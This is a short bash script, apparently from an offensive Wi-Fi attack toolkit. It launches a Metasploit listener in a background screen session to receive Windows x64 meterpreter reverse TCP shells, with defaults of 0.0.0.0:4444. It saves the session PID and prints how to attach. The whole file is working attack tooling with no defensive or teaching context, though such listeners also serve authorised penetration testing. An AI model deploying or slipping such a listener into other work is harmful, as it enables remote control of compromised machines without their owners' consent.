#!/bin/bash
# Start Metasploit listener

LHOST="${1:-0.0.0.0}"
LPORT="${2:-4444}"
PAYLOAD="${3:-windows/x64/meterpreter/reverse_tcp}"

SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts/internal/msf"
PID_FILE="/tmp/msf_listener_pid.txt"

echo "[*] Starting listener on $LHOST:$LPORT"
echo "[*] Payload: $PAYLOAD"

export LHOST LPORT PAYLOAD

# Start in background with screen
screen -dmS msf_listener msfconsole -q -r "$SCRIPT_DIR/listener.rc"

sleep 3

SCREEN_PID=$(screen -ls | grep msf_listener | cut -d. -f1 | tr -d '\t ')
if [ -n "$SCREEN_PID" ]; then
    echo "$SCREEN_PID" > "$PID_FILE"
    echo "[+] Listener started in screen session 'msf_listener'"
    echo "[+] Attach with: screen -r msf_listener"
else
    echo "[-] Failed to start listener"
    exit 1
fi
